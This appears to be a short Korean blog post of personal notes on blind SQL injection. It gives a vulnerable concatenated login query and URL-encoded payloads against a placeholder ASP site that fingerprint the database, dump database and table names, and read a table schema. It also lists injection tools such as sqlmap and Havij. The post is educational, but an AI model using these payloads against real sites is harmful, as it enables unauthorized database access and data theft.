---
layout: post
title: "Blind SQL injection"
date: 2014-06-14 01:49:20 +0900
comments: true
categories: 
---

#### Blind SQL injection

Case
    
    UNAME = "' or (ascii(substr(select user(),1,1))>63) --"
    PASS = ""
    QUERY = "select * from users where uname='" +UNAME+ "' and pass='" +PASS+ "'"

이런 상황에서 QUERY 는 다음과 같이 eval 된다. 

    select * from users where uname='' or (ascii(substr(select user(),1,1))>63) --' and pass=''

`uname=''` 을 만족하는 row 는 없을테니, `or` 뒷부분에 따라, 전체 query 의 결과가 달라진다.
이 차이가 HTTP Response Code 로 나타날 수도 있고, data 의 내용에 차이가 생길수도 있다. 
SQL WaitFor 로 Delay 를 삽입할 수도 있다.
Query 결과가 화면에 덤프되지는 않지만, 이런 미세한 차이를 보고 query 의 결과값을 추측하는 것이다.

우선 DB 종류를 확인.

    http://xxx.xxx.com/abc.asp?idConc=555%27%20or%20ascii(substring((select%20@@version),1,1))=94--

DB 이름을 덤프.

    http://xxx.xxx.com/abc.asp?idConc=555%27%20or%20ascii(substring((select%20DB_NAME(0)),1,1))=94--

TABLE 을 덤프.

    http://xxx.xxx.com/abc.asp?idConc=555%27%20or%20ascii(substring((select%20top%201%20TABLE_NAME%20from%20INFORMATION_SCHEMA.TABLES),1,1))=94--

TABLE schema 를 덤프.

    select top 1 COLUMN_NAME from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME='xxx_acesso';

그럼 쓸만한 query 들을 얻기 위해, Havij 가 사용하는 SQL query 들을 분석하도록 한다.

#### Havij

* [Hacking is child's play - SQL injection with Havij by 3 year old](http://www.troyhunt.com/2012/10/hacking-is-childs-play-sql-injection.html)
* [YouTube: Hacking is child's play - SQL injection with Havij by 3 year old](http://www.youtu.be/Fp47G4MQFvA)

#### BBQSQL

* [DEFCON 20: Rapid Blind SQL Injection](http://www.youtube.com/watch?v=Dh9Pa0kDfsc)
* [bbqsql github repo](https://github.com/Neohapsis/bbqsql)

#### SQL injection 에 관해 읽을만한 글은

* [libinjection](https://media.blackhat.com/bh-us-12/Turbo/Galbreath/BH_US_12_Galbreath_Libinjection_Slides.pdf)
* [New Techniques in SQLi Obfuscation](http://www.slideshare.net/nickgsuperstar/new-techniques-in-sql-obfuscation)

#### Tools

* bbqsql
* sqlmap
* sqlninja
* BSQL Hacker
* the Mole
* Havij
